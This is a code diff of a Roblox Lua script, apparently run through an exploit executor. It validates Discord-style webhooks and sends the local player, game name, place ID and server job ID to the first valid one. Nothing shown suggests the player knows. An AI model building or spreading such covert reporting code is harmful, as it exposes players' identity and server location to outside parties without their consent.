@@ -18,6 +18,7 @@ pcall(function()
     end
 end)
 if #Webhooks == 0 then
+    return
 end
 local function VerifyWebhook(webhook)
     return pcall(function()
@@ -25,25 +26,29 @@ local function VerifyWebhook(webhook)
             return requestFunc({Url = webhook, Method = "GET"})
         end)
         if not s or not r or not r.Body then return false end
-        local ds, data = pcall(HttpService.JSONDecode, HttpService, r.Body)
+        local ds, data = pcall(function() return HttpService:JSONDecode(r.Body) end)
         if not ds or not data then return false end
         if data.code == 10015 then return false end
         return data.name and data.name ~= ""
     end)
 end
-local ValidWebhooks = {}
+local WebhookURL = nil
 for _, wh in ipairs(Webhooks) do
     local success, isValid = pcall(function()
         return VerifyWebhook(wh)
     end)
     if success and isValid then
-        table.insert(ValidWebhooks, wh)
+        WebhookURL = wh
+        break
     end
+end
+if not WebhookURL then
+    return
 end
 local player = Players.LocalPlayer
 local placeId = game.PlaceId
 local jobId = game.JobId
-local gameName = "Unknown Game"
+local gameName = "Unknown"
 pcall(function()
     gameName = MarketplaceService:GetProductInfo(placeId).Name
 end)
@@ -68,20 +73,16 @@ local data = {
         timestamp = DateTime.now():ToIsoDate()
     }}
 }
-local jsonData = HttpService:JSONEncode(data)
-local sentCount = 0
-for _, webhook in ipairs(ValidWebhooks) do
-    pcall(function()
-        local success = pcall(function()
-            requestFunc({
-                Url = webhook,
-                Method = "POST",
-                Headers = {["Content-Type"] = "application/json"},
-                Body = jsonData
-            })
-        end)
-        if success then
-            sentCount = sentCount + 1
-        end
+pcall(function()
+    local success = pcall(function()
+        requestFunc({
+            Url = WebhookURL,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode(data)
+        })
     end)
-end
+    if success then
+    else
+    end
+end)
